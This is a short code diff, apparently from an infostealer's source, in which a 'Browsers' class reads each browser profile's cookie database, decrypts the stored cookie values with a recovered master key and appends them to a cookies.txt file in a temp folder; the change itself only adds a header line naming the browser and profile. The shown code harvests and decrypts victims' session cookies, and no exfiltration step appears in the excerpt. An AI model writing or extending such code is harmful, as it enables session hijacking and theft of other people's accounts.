@@ -663,6 +663,7 @@ class Browsers:
         conn = sqlite3.connect(cookievault)
         cursor = conn.cursor()
         with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
+            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
             for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
